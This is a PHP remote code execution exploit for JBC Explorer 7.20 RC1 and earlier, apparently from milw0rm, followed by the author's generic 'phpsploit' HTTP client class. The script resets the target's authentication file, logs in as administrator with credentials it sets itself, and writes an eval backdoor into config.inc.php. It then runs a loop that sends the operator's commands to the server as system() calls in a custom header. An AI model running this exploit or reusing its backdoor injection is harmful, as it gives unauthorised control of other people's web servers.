#!/usr/bin/php
<?php
error_reporting(E_ALL ^ E_NOTICE);

head();
if($argc < 3) usage();

$url = getparam('url', true);
$prx = getparam('proxy', false);
$pra = getparam('proxyauth', false);
$cod = 'eval($_SERVER[HTTP_SHELL]);';

$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
$xpl->allowredirection(1);
$xpl->cookiejar(1);

if($prx) $xpl->proxy($prx);
if($pra) $xpl->proxyauth($pra);

print "0x01>Deleting the file auth.inc.php";
$xpl->post($url.'dirsys/modules/auth.php', 'suppr=1');

print "\n0x02>Creating the file auth.inc.php";
$xpl->post($url.'dirsys/modules/auth.php', 'login=root&password=toor');

print "\n0x03>Trying to log in as Administrator";
$xpl->post($url.'dirsys/modules/auth.php', 'login=root&password=toor');

// Minimum data necessary (fwrite without quote)
$minimdata =
'WIDTH_TREE_FRAME=1&FRAME_BORDER=1&WIDTH_FRAME_BORDER=1&WIDTH_FRAME_SP'.
'ACING=1&SCROLING_TREE_FRAME=1&RESIZE_FRAME=1&WIDTH_TD_SIZE=1&WIDTH_TD'.
'_TYPE=1&WIDTH_TD_DATE=1&STYLE=1&TOTALSIZE=1&CHECK_MAJ=1&IMAGE_BROWSER'.
'=1&IMAGE_TN=1&GD2=1&IMAGE_JPG=1&IMAGE_GIF=1&IMAGE_BMP=1&IMAGE_TN_SIZE'.
'=1&IMAGE_TN_COMPRESSION=1&NB_COLL_TN=1&EXIF_READER=1&SLIDE_SHOW=1&DEB'.
'UG=0;'.urlencode($cod).'//&SLIDE_SHOW_INT=1&BACK=1&WRITE_TN=1&AUTO_RE'.
'SIZE=1&DETAILS=1&DIRINFO_LIFE=1&activer_Message=1';

print "\n0x04>Creating the file config.inc.php";
$xpl->post($url.'dirsys/modules/config/post.php', $minimdata);
print "\n0x05>Now enter your commands";

do 
{
	$xpl->addheader('Shell', "@system($cmd);");
	$xpl->get($url.'dirsys/config.inc.php');
	print $xpl->getcontent()."\n0x06>";
}
while(!eregi('^quit|exit$', $cmd = trim(fgets(STDIN))));

exit(0);


function getparam($param,$opt='')
{
	global $argv;
	
	foreach($argv as $value => $key)
	{
		if($key == '-'.$param)
		   return $argv[$value+1];
	}
	
	if($opt)
	   usage();
	else
	   return FALSE;
}

function head()
{
	print 
	"\nJBC Explorer <= V7.20 RC 1\n".
	"Remote Code Execution Exploit\n\n".
	"by DarkFig <gmdarkfig (at) gmail (dot) com>\n".
	"http://acid-root.new.fr/\n".
	"#acidroot@irc.worldnet.net\n\n";
}

function usage()
{
	print
	"Usage:\n".
	"sploit.php -url <url> [Options]\n\n".
	"Options:\n".
	"-proxy <proxyhost:proxyport>".
	"\n-proxyauth <proxyuser:proxypwd>\n";
	
	exit(1);
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don't have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
		
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method=='get')
		   $this->packet = 'GET '.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method=='post' or $this->method=='formdata')
		   $this->packet = 'POST '.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass)."\r\n";
		
		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= 'Cookie: '.$this->showcookie()."\r\n";
	
		$this->packet .= 'Host: '.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method=='post')
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method=='formdata')
		{
			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary."\r\n";
			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = '';

		fputs($socket,$this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie('name','value')
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader('Client-IP', '128.5.2.3')
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy('localhost',8118)
	 * @example $this->proxy('localhost:8118')
	 * 
	 */
	function proxy($proxy,$proxyp='')
	{
		if(empty($proxyp))
		{
			$proxarr = explode(':',$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth('user','pwd')
	 * @example $this->proxyauth('user:pwd');
	 * 
	 */
	function proxyauth($proxyauth,$proxypass='')
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,':');
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the 'User-Agent' header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent('Firefox')
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader('User-Agent',$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @example $this->showheader()
	 * 
	 */
	function showheader()
	{
		$this->header_str = '';
		
		if(!isset($this->header))
		   return;
		   
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.': '.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @example $this->showcookie()
	 * 
	 */
	function showcookie()
	{
		$this->cookie_str = '';
		
		if(!isset($this->cookie))
		   return;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.'='.$value.'; ';

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get('localhost/index.php?var=x')
	 * @example $this->get('http://localhost:88/tst.php')
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = 'get';
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post('http://localhost/','helo=x')
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = 'post';
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => 'http://localhost/upload.php',
	 *                      frmdt_boundary => '123456', # Optional
	 *                      'var' => 'example',
	 *                      'file' => array(
	 *                                frmdt_type => 'image/gif',  # Optional
	 *                                frmdt_transfert => 'binary' # Optional
	 *                                frmdt_filename => 'hello.php,
	 *                                frmdt_content => '<?php echo 1; ?>'));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = 'formdata';
		$this->data = '';
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = 'phpsploit';
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			if(!preg_match('#^frmdt_(boundary|url)#',$key))
			{
				$this->data .= str_repeat('-',29).$this->boundary."\r\n";
				$this->data .= 'Content-Disposition: form-data; name="'.$key.'";';
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= ' filename="'.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat('-',29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get('http://localhost/'))
	 * 
	 */
	function getcontent($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = '';
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post('http://localhost/','1=2'))
	 * 
	 */
	function getheader($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don't have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			if(preg_match('/set-cookie/i',$header))
			{
				$fequal = strpos($header,'=');
				$fvirgu = strpos($header,';');
				
				// 12=strlen('set-cookie: ')
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don't have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target('http://localhost/')
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg('^http://',$urltarg))
		   $urltarg = 'http://'.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];
		
		if(isset($urlarr['query']))
		   $this->url .= '?'.$urlarr['query'];
		
		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
		$this->host = $urlarr['host'];
		
		if($this->port != '80')
		   $this->host .= ':'.$this->port;

		if(!isset($urlarr['path']) or empty($urlarr['path']))
		   die("Error: No path precised");

		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);

		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * 'Set-Cookie' headers values
	 * and it will automatically add
	 * them into the 'Cookie' header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code=='0')
		   $this->cookiejar=FALSE;

		elseif($code=='1')
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code=='0')
		   $this->allowredirection=FALSE;
		   
		elseif($code=='1')
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don't have to call it.
	 *
	 * @access private
	 * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg('://',$this->last_redirection))
			   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset('header')
	 * @example $this->reset('cookie')
	 * @example $this->reset()
	 * 
	 */
	function reset($func='')
	{
		switch($func)
		{
			case 'header':
			$this->header = array('');
			break;
				
			case 'cookie':
			$this->cookie = array('');
			break;
				
			default:
			$this->cookiejar = '';
			$this->header = array('');
			$this->cookie = array('');
			$this->allowredirection = '';
			break;
		}
	}
}

?>

# milw0rm.com [2007-11-05]